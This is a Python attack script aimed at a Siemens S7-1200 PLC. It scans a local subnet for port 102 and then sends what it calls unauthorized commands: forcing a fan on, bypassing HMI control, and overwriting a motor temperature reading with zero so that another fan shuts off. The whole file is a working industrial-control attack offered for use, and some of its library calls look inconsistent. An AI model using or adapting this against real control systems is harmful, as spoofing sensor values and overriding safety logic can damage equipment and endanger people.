import snap7
import time
import socket

# Define PLC connection parameters
PLC_IP = None  # Initialize PLC_IP to None, it will be discovered if not manually set
RACK = 0
SLOT = 1
DB_NUMBER = 1  # Not used in this example, but good practice to keep it

# Define tag addresses (using the provided tag table)
ACTIVATE_FAN_A_ADDRESS = (0, 0, 0, snap7.util.S7WLBit)  # Memory area, byte, bit, data type
ACTIVATE_FAN_B_ADDRESS = (0, 0, 1, snap7.util.S7WLBit)
MASTER_FAN_B_HMI_ADDRESS = (0, 0, 5, snap7.util.S7WLBit)
MOTOR_TEMP_ADDRESS = (7, 0, 0, snap7.util.S7WLWord)  # Memory area, byte, bit, data type (Integer)


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network.

    This is a basic example and might not work in all network configurations.
    For production environments, it's best to manually configure the PLC IP address.
    """
    # This is a very rudimentary scan and may not be reliable.  More sophisticated
    # network scanning techniques (e.g., using nmap) are more effective but require
    # elevated privileges and are outside the scope of this example.
    print("Attempting to discover PLC IP address...")
    for i in range(1, 255):  # Scan a small subnet - adjust to your network
        ip = "192.168.1." + str(i)  # Assuming a 192.168.1.x network
        try:
            # Create a socket and attempt to connect to port 102 (standard S7 port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Short timeout to avoid long delays
            result = sock.connect_ex((ip, 102))
            if result == 0:
                print(f"Found PLC at IP address: {ip}")
                return ip
            sock.close()
        except socket.error:
            pass
    print("PLC IP address not automatically found.  Please configure PLC_IP manually.")
    return None



def connect_to_plc(ip_address, rack, slot):
    """Connects to the Siemens S7-1200 PLC."""
    plc = snap7.client.Client()
    try:
        plc.connect(ip_address, rack, slot)
        print(f"Connected to PLC at {ip_address}")
        return plc
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        return None


def write_tag(plc, address, value, data_type):
    """Writes a value to a specific tag in the PLC."""
    area, byte, bit, wl = address
    try:
        if data_type == snap7.util.S7WLBit:
            plc.mb_write(byte, [value])
        elif data_type == snap7.util.S7WLWord:  # Example for writing an integer
            data = bytearray(2)  # Create a byte array to hold the integer
            snap7.util.set_int(data, 0, value)  # Set the integer value
            plc.mw_write(byte, data)  # Write the integer to the PLC
        else:
            print("Unsupported data type.")
            return

        print(f"Successfully wrote value {value} to address: {address}")

    except Exception as e:
        print(f"Error writing to PLC: {e}")


def main():
    global PLC_IP
    """Main function to execute the unauthorized command message attack."""

    if not PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("Aborting.  Please manually set the PLC_IP variable.")
            return

    plc = connect_to_plc(PLC_IP, RACK, SLOT)
    if not plc:
        return

    try:
        # **Unauthorized Command Message Attack:**

        # Scenario:  Forcefully activate Fan B, bypassing normal temperature thresholds and HMI control

        # 1. Set Activate_Fan_B directly (ignoring temperature readings):
        print("Attempting unauthorized command: Activating Fan B directly...")
        write_tag(plc, ACTIVATE_FAN_B_ADDRESS, True, snap7.util.S7WLBit)
        time.sleep(1) #give time to the PLC to process
        # 2. Set Master_Fan_B_HMI directly to bypass HMI control
        print("Attempting unauthorized command: Activating Master_Fan_B_HMI directly...")
        write_tag(plc, MASTER_FAN_B_HMI_ADDRESS, True, snap7.util.S7WLBit)
        time.sleep(1)

        # 3. Setting a very low temperature to disable Fan A if active.
        print("Attempting unauthorized command: Setting low temperature to disable Fan A...")
        write_tag(plc, MOTOR_TEMP_ADDRESS, 0, snap7.util.S7WLWord)  # Set temp to 0.  This should cause fan A to turn off

        print("Unauthorized commands sent.  Check PLC outputs for effect.")

    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()